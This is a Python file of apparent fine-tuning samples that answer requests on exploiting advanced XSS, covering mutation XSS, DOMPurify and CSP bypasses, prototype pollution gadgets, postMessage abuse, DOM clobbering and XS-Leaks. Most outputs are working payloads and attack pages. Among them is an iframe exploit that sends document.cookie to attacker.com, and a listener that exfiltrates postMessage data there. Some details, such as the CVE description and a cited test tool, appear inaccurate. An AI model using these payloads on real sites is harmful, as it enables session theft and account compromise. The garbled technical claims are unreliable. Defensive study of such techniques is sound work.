#!/usr/bin/env python3
"""
Advanced XSS dataset: mXSS, CSP bypass, Prototype Pollution,
PostMessage abuse, DOM clobbering, and multi-context exploitation.
"""

from generate_dataset import Sample

ADVANCED_XSS_SAMPLES = [
    # ── mXSS / Mutation XSS ──────────────────────────────────
    Sample(
        instruction="Explain mutation XSS (mXSS) and how HTML parser inconsistencies enable it.",
        input="Target: application using innerHTML sanitization via DOMPurify 2.x",
        output="""## Mutation XSS (mXSS)

mXSS exploits the fact that HTML is re-parsed (mutated) after sanitization,
causing seemingly-safe strings to become executable.

### Core Mechanism

The parser sees:
```
Input  →  Sanitizer  →  "safe" string  →  innerHTML assignment  →  Re-parsed (MUTATED)  →  XSS
```

The browser's HTML parser mutates certain constructs differently from the sanitizer's parser.

### Classic mXSS Vectors

**1. Namespace confusion (SVG/MathML)**
```html
<!-- Input to sanitizer (appears safe) -->
<svg><p><style><img src=x onerror=alert(1)></style></p></svg>

<!-- After innerHTML assignment, browser re-parses as: -->
<svg><p></p><style>...</style><img src=x onerror=alert(1)></svg>
```

**2. Template tag mutation**
```html
<template><xmp><script>alert(1)</script></xmp></template>
<!-- Template content is inert during sanitization but executed on insertion -->
```

**3. noscript tag in head**
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

**4. Dangling markup in table**
```html
<table><tr><td><xmp></td></tr></table><script>alert(1)</script>
```

### DOMPurify Bypass History

**CVE-2020-26870 (DOMPurify < 2.1.0)**
```javascript
// Bypassed via prototype pollution of isTrustedType
Object.prototype.FORCE_BODY = true;
// Then: DOMPurify.sanitize('<svg><use href="data:...">') → XSS
```

**Template literal bypass (< 2.3.0)**
```html
<form><math><mtext></form><form><mglyph><svg>
<mtext><textarea></mtext><title><style></title></textarea>
<image src onerror=alert(1)>
```

### Detection Methodology

1. **Identify sanitizer version** via package.json or CDN URL
2. **Check all innerHTML, outerHTML, insertAdjacentHTML sinks**
3. **Test with mXSS polyglots**:
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

4. **Automated tools**:
```bash
# mXSS scanner via DOM testing
python3 -c "
import subprocess
payloads = [
    '<svg><p><style><img src=x onerror=alert(1)></style></p></svg>',
    '<table><tr><td><xmp></xmp></td></tr><img src=x onerror=alert(1)>',
]
for p in payloads:
    print(repr(p))
"

# Use DOMPurify test harness
npx dompurify-test --payload-file mxss_payloads.txt
```

### Defense
- Always use latest DOMPurify
- Enable `FORCE_BODY: true` option
- Use Trusted Types API (Chrome):
```javascript
const policy = trustedTypes.createPolicy('default', {
  createHTML: input => DOMPurify.sanitize(input)
});
element.innerHTML = policy.createHTML(userInput);
```
""",
        category="xss",
        subcategory="mutation_xss",
    ),
    # ── CSP Bypass ───────────────────────────────────────────
    Sample(
        instruction="How do you bypass Content Security Policy (CSP) to execute XSS when script-src is restricted?",
        input="CSP header: Content-Security-Policy: default-src 'self'; script-src 'nonce-abc123' 'strict-dynamic'",
        output="""## CSP Bypass Techniques

CSP is a defense-in-depth mechanism. Misconfigurations or trusted-but-abusable sources often allow bypass.

### Analyzing the CSP

```
script-src 'nonce-abc123' 'strict-dynamic'
```

- `nonce-abc123`: Only scripts with `<script nonce="abc123">` execute
- `'strict-dynamic'`: Scripts loaded BY a nonced script inherit trust (bypasses allowlist)

### Attack Vectors

**1. Nonce Leakage via Referrer Header**
```html
<!-- If nonce appears in page source AND the page links to attacker-controlled domain -->
<a href="https://attacker.com">click</a>
<!-- Attacker reads Referer: https://victim.com/page?...nonce=abc123 (if leaked in URL) -->
```

**2. Strict-Dynamic + Trusted CDN Abuse**
If `'strict-dynamic'` is set and a nonced script loads from a CDN:
```javascript
// Attacker uploads malicious.js to the trusted CDN (if upload is possible)
// The nonced bootstrap script: <script nonce="abc123" src="//cdn.example.com/bootstrap.js">
// bootstrap.js dynamically creates: var s=document.createElement('script'); s.src='//attacker.com/xss.js'
// This inherits trust via strict-dynamic
```

**3. Script Gadgets (No CDN needed)**
Using existing trusted JS on the page:
```html
<!-- AngularJS loaded from same origin (trusted): -->
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>

<!-- jQuery.globalEval() with user-controlled data: -->
<div id="json-data">{"callback":"alert(1)"}</div>
```

**4. JSONP Endpoint Abuse**
```
CSP: script-src 'self' https://accounts.google.com
```
```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
```

**5. data: URI with base-uri bypass**
```
CSP: script-src 'self'; base-uri 'none'  ← missing base-uri allows:
<base href="https://attacker.com">
<script src="/trusted.js"></script>  <!-- loads attacker.com/trusted.js -->
```

**6. Polyglot CSP Bypass via object-src missing**
```html
<!-- If object-src not set, defaults to default-src 'self' -->
<object data="//attacker.com/flash.swf"></object>  <!-- Flash era -->
<!-- Modern: PDF with JS -->
<object data="/upload/malicious.pdf" type="application/pdf"></object>
```

### Automated CSP Analysis

```bash
# CSP evaluator
curl -s -I https://target.com | grep -i content-security-policy | \
  python3 -c "
import sys, json, urllib.request
csp = sys.stdin.read().split(':', 1)[1].strip()
req = urllib.request.Request(
  'https://csp-evaluator.withgoogle.com/getCSPEvaluation',
  data=json.dumps({'csp': csp}).encode(),
  headers={'Content-Type': 'application/json'}
)
print(urllib.request.urlopen(req).read().decode())
"

# csp-auditor (Burp extension script)
python3 -m csp_auditor --url https://target.com

# Manual: check for JSONP on allowed domains
curl "https://allowed-cdn.com/api?callback=alert"
```

### CSP Bypass Cheat Sheet by Directive

| Missing/Weak Directive | Attack |
|------------------------|--------|
| No `object-src` | Flash/PDF injection |
| No `base-uri` | Base tag hijack |
| `unsafe-inline` present | Direct `<script>` / event handler |
| `unsafe-eval` present | `eval()`, `setTimeout(string)` |
| Wildcards `*.cdn.com` | Upload .js to trusted subdomain |
| `data:` in script-src | `<script src="data:,alert(1)">` |
| `'strict-dynamic'` only | Script gadgets in loaded libraries |
""",
        category="xss",
        subcategory="csp_bypass",
    ),
    # ── Prototype Pollution → XSS ────────────────────────────
    Sample(
        instruction="Explain prototype pollution and how it leads to XSS in JavaScript applications.",
        input="Target: Node.js app using lodash < 4.17.16, client-side rendering",
        output="""## Prototype Pollution → XSS

Prototype pollution allows attackers to inject properties into `Object.prototype`,
affecting all objects in the application and potentially enabling XSS.

### What is Prototype Pollution?

Every JavaScript object inherits from `Object.prototype`. Polluting it:
```javascript
Object.prototype.isAdmin = true;

const user = {};
console.log(user.isAdmin);  // true — pollution affects all objects!
```

### Common Vulnerable Patterns

**1. Merge/extend functions (lodash, jQuery)**
```javascript
// Lodash < 4.17.16
_.merge({}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
console.log({}.polluted);  // "yes"
```

**2. Path-based assignment**
```javascript
// e.g., qs library parsing: ?__proto__[admin]=true
_.set({}, '__proto__.admin', true);
```

**3. Constructor property**
```javascript
_.merge({}, {"constructor": {"prototype": {"evil": true}}})
```

### From Pollution to XSS

**Gadget 1: innerHTML via polluted `innerHTML` default**
```javascript
// App code:
function render(config) {
    element.innerHTML = config.template || defaultTemplate;
}
// Pollution: Object.prototype.template = '<img src=x onerror=alert(1)>'
// Now: render({}) → XSS
```

**Gadget 2: Script source injection**
```javascript
// App code (simplified webpack/module loader):
const src = options.src || '/default.js';
document.write('<script src="' + src + '"></script>');
// Pollution: Object.prototype.src = '//attacker.com/xss.js'
```

**Gadget 3: Angular template injection via pollution**
```javascript
// Pollute: Object.prototype.bypassSecurityTrustHtml = () => payload
// Angular's DomSanitizer checks may be bypassed
```

**Gadget 4: jQuery html() sink**
```javascript
// jQuery reads innerHTML from options
// Pollution: Object.prototype.html = '<img src=x onerror=alert(1)>'
$('.content').html(userConfig);  // Uses polluted property if userConfig.html undefined
```

### Exploitation via URL Parameters (Client-side)

```
https://target.com/#__proto__[innerHTML]=<img src=x onerror=alert(1)>
https://target.com/?__proto__.template=<script>alert(1)</script>
```

### Server-side: Denial of Service / RCE via Pollution

```javascript
// Server code (Express):
const options = merge({}, req.body);
const proc = child_process.spawn(options.shell || '/bin/sh', ['-c', cmd]);
// Pollution via: {"__proto__": {"shell": "/usr/bin/node", ...}}  → Node RCE
```

### Detection

```bash
# Client-side: Browser console
Object.prototype.x = 'polluted';
fetch('/api/data', {method: 'POST', body: '{"__proto__":{"x":"POLLUTED"}}'})
  .then(r => r.json())
  .then(d => console.log('Polluted?', {}.x === 'POLLUTED'));

# Server-side testing
curl -X POST https://target.com/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"polluted":true}}'

# Automated: use ppmap or pp-finder
npx ppmap --url https://target.com
```

### Fix
```javascript
// Freeze prototype
Object.freeze(Object.prototype);

// Safe merge
const safeObj = Object.create(null);  // No prototype
Object.assign(safeObj, untrustedData);

// Validate keys
function safeMerge(target, source) {
    for (const key of Object.keys(source)) {
        if (key === '__proto__' || key === 'constructor') continue;
        target[key] = source[key];
    }
}
```
""",
        category="xss",
        subcategory="prototype_pollution",
    ),
    # ── PostMessage Attacks ──────────────────────────────────
    Sample(
        instruction="How do you exploit insecure postMessage handlers for XSS and data theft?",
        input="Target: SPA with embedded iframe that listens for postMessage events",
        output="""## PostMessage-based XSS and Data Theft

`window.postMessage` is an HTML5 cross-origin communication API. Insecure handlers
are a common source of XSS and CSRF in SPAs.

### Vulnerability Pattern

```javascript
// VULNERABLE: No origin check
window.addEventListener('message', function(e) {
    document.getElementById('content').innerHTML = e.data;
});

// VULNERABLE: Weak origin check
window.addEventListener('message', function(e) {
    if (e.origin.includes('trusted.com')) {  // 'evil-trusted.com' passes!
        eval(e.data.code);
    }
});

// VULNERABLE: Target origin wildcard on send
parent.postMessage(sensitiveData, '*');  // Any origin receives this
```

### Attack 1: Direct XSS via innerHTML Sink

Create a malicious page:
```html
<!-- attacker.com/exploit.html -->
<iframe id="victim" src="https://target.com/page"></iframe>
<script>
window.onload = () => {
    document.getElementById('victim').contentWindow.postMessage(
        '<img src=x onerror="fetch(`https://attacker.com/?c=`+document.cookie)">',
        '*'
    );
};
</script>
```

### Attack 2: Bypass Weak Origin Check

```javascript
// Target checks: e.origin === 'https://trusted.com'
// Attacker registers: https://trusted.com.attacker.com  ← won't fool strict check
// But against: e.origin.includes('trusted') → evil-trusted.com works!

// Or: find a subdomain takeover on trusted.com
// Or: XSS on trusted.com to send the message
```

### Attack 3: Data Exfiltration (insecure postMessage to *)

If target sends: `parent.postMessage({token: authToken}, '*')`

```html
<!-- Attacker embeds target in iframe: -->
<iframe src="https://target.com/oauth/callback?code=..."></iframe>
<script>
window.addEventListener('message', e => {
    fetch('https://attacker.com/steal?data=' + JSON.stringify(e.data));
});
</script>
```

### Attack 4: Message Serialization Abuse

```javascript
// If handler does: JSON.parse(e.data) and then processes 'type' field:
postMessage(JSON.stringify({
    type: '__proto__',   // Prototype pollution via message
    data: {admin: true}
}), '*');
```

### Reconnaissance

```javascript
// In browser console on target page:
// Find all message listeners
const listeners = [];
const originalAddEventListener = EventTarget.prototype.addEventListener;
EventTarget.prototype.addEventListener = function(type, listener, ...args) {
    if (type === 'message') listeners.push({target: this, listener: listener.toString()});
    return originalAddEventListener.apply(this, [type, listener, ...args]);
};

// Or use browser extension: MessageHook
```

```bash
# Static analysis: search source for insecure patterns
grep -rn "addEventListener.*message" --include="*.js" ./src/
grep -rn "postMessage.*\*" --include="*.js" ./src/
grep -rn "e\.data\|event\.data" --include="*.js" ./src/ | grep -v "type\|check\|verify"
```

### Automated Testing

```python
# Selenium-based postMessage fuzzer
from selenium import webdriver
from selenium.webdriver.common.by import By
import time

driver = webdriver.Chrome()
driver.get("https://target.com/page")

# Inject message listener monitor
driver.execute_script(
    "window._messages = [];"
    "window.addEventListener('message', e => window._messages.push({"
    "    origin: e.origin, data: e.data"
    "}));"
)

# Send XSS payloads
driver.execute_script(
    "window.postMessage('<img src=x onerror=alert(1)>', '*');"
    "window.postMessage({type:'html',content:'<script>alert(1)</script>'}, '*');"
)
time.sleep(1)
print(driver.execute_script("return window._messages"))
```
""",
        category="xss",
        subcategory="postmessage_abuse",
    ),
    # ── DOM Clobbering ───────────────────────────────────────
    Sample(
        instruction="What is DOM clobbering and how can it be chained with XSS or security control bypass?",
        input="",
        output="""## DOM Clobbering

DOM clobbering overwrites JavaScript variables by injecting HTML elements with
matching `id` or `name` attributes. Named elements become properties of `window` and `document`.

### Core Mechanism

```html
<!-- In HTML: -->
<img id="config">

<!-- In JavaScript: -->
console.log(window.config);  // → HTMLImageElement (not the expected object!)
```

Named forms/inputs:
```html
<form id="config"><input name="key" value="malicious"></form>
```
```javascript
window.config.key  // → HTMLInputElement
window.config.key.value  // → "malicious"
```

### Attack Scenario 1: Bypass Null Check

```javascript
// Vulnerable app code:
var config = config || {};  // Expects undefined if not set
config.apiEndpoint = config.apiEndpoint || 'https://api.safe.com';
fetch(config.apiEndpoint + '/data');
```

```html
<!-- Attacker injects HTML (e.g., via markdown, stored XSS-lite, or HTML injection): -->
<a id="config" href="https://attacker.com"></a>

<!-- Now: config = HTMLAnchorElement
     config.apiEndpoint = undefined  → uses default 'https://api.safe.com'
     BUT if app does: fetch(config + '/data')  → "https://attacker.com/data" -->
```

### Attack Scenario 2: Script Source Clobbering

```javascript
// App dynamically loads scripts:
var scripts = document.getElementById('scripts');
if (scripts) {
    scripts.forEach(src => loadScript(src));
}
```

```html
<form id="scripts">
  <input name="0" value="https://attacker.com/malicious.js">
</form>
```

### Attack Scenario 3: nonce Bypass via DOM Clobbering

```javascript
// CSP nonce-based protection:
var nonce = document.querySelector('script[nonce]').nonce;
var script = document.createElement('script');
script.nonce = nonce;
script.src = userControlledSrc;  // ← XSS if src is controlled
```

```html
<!-- Clobber: override querySelector result -->
<form name="querySelector"><input name="nonce" value="CLOBBERED"></form>
```

### Attack Scenario 4: Chaining with HTML Injection → XSS

```html
<!-- Step 1: HTML injection allows <a id="x"> but not <script> -->
<!-- Step 2: App code: -->
<script>
var x = x || {host: 'safe.com'};
document.location = 'https://' + x.host + '/api';  // Open redirect / SSRF
</script>

<!-- Clobber: <a id="x" href="javascript:alert(1)"> → x.host = "javascript:alert(1)" -->
<!-- Result: location = "https://javascript:alert(1)/api" → JS execution in some browsers -->
```

### Advanced: Two-level Clobbering

```javascript
// Target code:
x.y.z = 'value';  // Needs two levels of clobbering
```

```html
<!-- HTMLCollection trick: -->
<form id="x"><input id="y" name="z" value="clobbered"></form>
<!-- x → HTMLFormElement
     x.y → HTMLInputElement (input with id/name 'y')
     x.y.z → undefined... need further tricks -->

<!-- Or: iframes -->
<iframe name="x" srcdoc="<a id=y href='clobbered://'>"></iframe>
<!-- x.y → anchor element → x.y.toString() = 'clobbered://' -->
```

### Detection

```bash
# Search for vulnerable patterns
grep -rn "window\.\|document\." --include="*.js" | grep -E "\|\||if.*undefined||| {}"
grep -rn "getElementById\|querySelector" --include="*.js" | grep -v "null\|undefined" -A2
```

```javascript
// Browser-based detection: check if DOM ids shadow globals
document.querySelectorAll('[id]').forEach(el => {
    if (window[el.id] === el) {
        console.warn('Potential clobbering target:', el.id);
    }
});
```
""",
        category="xss",
        subcategory="dom_clobbering",
    ),
    # ── XS-Leaks ──────────────────────────────────────────────
    Sample(
        instruction="What are XS-Leaks (Cross-Site Leaks) and how do they bypass SameSite cookies and CORS?",
        input="",
        output="""## XS-Leaks (Cross-Site Leaks)

XS-Leaks are a class of attacks that infer sensitive information from cross-origin resources
by measuring **side channels** — without violating SOP directly.

### Core Concept

The attacker's page loads a cross-origin resource and observes:
- Page **load time** (cache timing)
- **Error vs success** events
- **Frame count** of embedded pages
- **History length** changes
- **Resource size** (via Performance API)

### Attack 1: Cache Timing (Are you logged in?)

```html
<!-- attacker.com/probe.html -->
<script>
async function probeCached(url) {
    const t0 = performance.now();
    await fetch(url, {mode: 'no-cors', credentials: 'include', cache: 'force-cache'});
    return performance.now() - t0;
}

const t = await probeCached('https://victim.com/profile/avatar.png');
// Cached (fast) → user is logged in and has loaded the page before
// Not cached (slow) → user not logged in or first visit
</script>
```

### Attack 2: Error-based State Detection

```javascript
// Target: https://bank.com/api/account?id=1234
// Returns 200 if account exists for authenticated user, 404 otherwise

const img = new Image();
img.onload = () => console.log('Account 1234 exists for this user!');
img.onerror = () => console.log('No account or not logged in');
img.src = 'https://bank.com/api/account/1234/avatar.png';
// credentials are sent automatically (cookies)
```

### Attack 3: Frame Count Leak

```javascript
// Search results page changes frame count based on results
const popup = window.open('https://target.com/search?q=secretterm');
setTimeout(() => {
    // popup.frames.length differs for 0 results vs 5 results
    console.log('Frame count:', popup.frames.length);
}, 2000);
```

### Attack 4: Navigation/History Leak

```javascript
// Does target redirect user to /dashboard (logged in) or /login?
const win = window.open('https://target.com/profile');
setTimeout(() => {
    // history.length reveals how many redirects occurred
    console.log('Redirects:', win.history.length);
}, 1500);
```

### Attack 5: Performance API (Resource Size)

```javascript
// Load cross-origin resource, then check transferred size
const observer = new PerformanceObserver(list => {
    for (const entry of list.getEntries()) {
        if (entry.name.includes('target.com')) {
            console.log('Transfer size:', entry.transferSize);
            // Different size for "admin account" vs "normal account" page
        }
    }
});
observer.observe({type: 'resource', buffered: true});
fetch('https://target.com/account/details', {credentials: 'include'});
```

### Attack 6: Timing via Service Worker

```javascript
// Register SW that intercepts requests
navigator.serviceWorker.register('/sw.js');
// SW reports timing of cross-origin fetches back to attacker
```

### Real-world Impact

| Leak | Information Gained |
|------|--------------------|
| Search endpoint timing | User's search history, whether they searched a term |
| Inbox size | Number of unread emails |
| Auth redirect count | Whether target is authenticated |
| Error on private resource | Existence of specific resource |
| Cache hit | Recently visited pages |

### Defense

- **Vary: Cookie** header (prevent caching of authenticated resources)
- **Cross-Origin-Resource-Policy: same-origin**
- **Cross-Origin-Opener-Policy: same-origin** (isolates window)
- **Randomized URLs** for user-specific resources
- **SameSite=Lax/Strict** cookies (reduces but doesn't eliminate)
- **Framing protection**: `X-Frame-Options: DENY`
- **Timing jitter**: Add random delays to authenticated endpoints
""",
        category="xss",
        subcategory="xs_leaks",
    ),
]
